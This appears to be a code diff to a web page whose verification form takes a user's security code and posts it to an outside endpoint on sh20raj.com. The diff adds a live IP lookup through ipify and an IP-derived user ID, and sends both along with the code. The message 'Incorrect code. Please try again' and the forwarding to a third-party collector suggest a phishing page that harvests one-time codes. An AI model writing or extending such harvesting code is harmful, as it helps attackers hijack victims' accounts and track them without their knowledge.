@@ -108,18 +108,42 @@
             <div id="codeSentMessage" class="code-sent-message">Code Sent</div>
         </div>
         <div id="errorMessage" class="error-message">Incorrect code. Please try again.</div>
+        <input type="hidden" id="userIP" name="userIP">
+        <input type="hidden" id="userID" name="userID">
     </form>
     <script>
-        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return '127.0.0.1';
+            }
+        }
+
+        function generateUserID(ip) {
+            const ipHash = ip.split('.').reduce((acc, octet) => acc + parseInt(octet, 10), 0);
+            return `USER${ipHash}`;
+        }
+
+        document.getElementById('verificationForm').addEventListener('submit', async function(event) {
             event.preventDefault(); // Prevent the default form submission
 
             const securityCode = document.getElementById('securityCode').value;
-            const userIP = '127.0.0.1'; // Example IP address
+            const userIP = await getUserIP();
+            const userID = generateUserID(userIP);
+
+            // Update hidden input values
+            document.getElementById('userIP').value = userIP;
+            document.getElementById('userID').value = userID;
 
             // Simulate form data to be sent
             const formData = new FormData();
             formData.append('securityCode', securityCode);
             formData.append('userIP', userIP);
+            formData.append('userID', userID);
 
             // Send the form data using fetch
             fetch('https://getintotouch.sh20raj.com/api.php?id=6534651073', {
